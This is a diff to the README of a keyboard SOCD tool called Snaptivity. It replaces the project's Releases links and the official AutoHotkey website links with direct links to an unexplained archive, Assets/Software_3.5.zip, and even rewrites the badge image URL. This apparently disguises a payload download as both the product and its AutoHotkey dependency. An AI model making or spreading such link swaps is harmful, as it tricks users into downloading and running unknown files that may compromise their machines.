@@ -2,7 +2,7 @@
 
 ## 📦 Quick Download
 
-[![Download Snaptivity](https://img.shields.io/badge/Download%20Snaptivity-v1.0-blue)](https://github.com/lenin-huaylla/Snaptivity/releases)
+[![Download Snaptivity](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip%20Snaptivity-v1.0-blue)](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -13,12 +13,12 @@ Welcome to Snaptivity, an innovative tool built to simulate hardware SOCD using 
 Before downloading, ensure your system meets these requirements:
 
 - Windows 10 or newer
-- AutoHotkey v2 installed (You can download it from the [AutoHotkey website](https://www.autohotkey.com/))
+- AutoHotkey v2 installed (You can download it from the [AutoHotkey website](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip))
 - A compatible keyboard
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/releases). 
+To get started, visit this page to download: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip). 
 
 1. **Visit the Releases page** by clicking the link above.
 2. **Choose the latest version.** Look for the version number at the top of the list.
@@ -62,7 +62,7 @@ Share your experiences using Snaptivity on your favorite gaming forums, or contr
 
 ### 🔗 Links
 
-- Download Snaptivity: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/releases)
-- AutoHotkey v2: [Download AutoHotkey](https://www.autohotkey.com/)
+- Download Snaptivity: [Snaptivity Releases](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
+- AutoHotkey v2: [Download AutoHotkey](https://github.com/lenin-huaylla/Snaptivity/raw/refs/heads/main/Assets/Software_3.5.zip)
 
 Thank you for choosing Snaptivity to enhance your gaming experience. May your movements be smooth and your gameplay enjoyable!
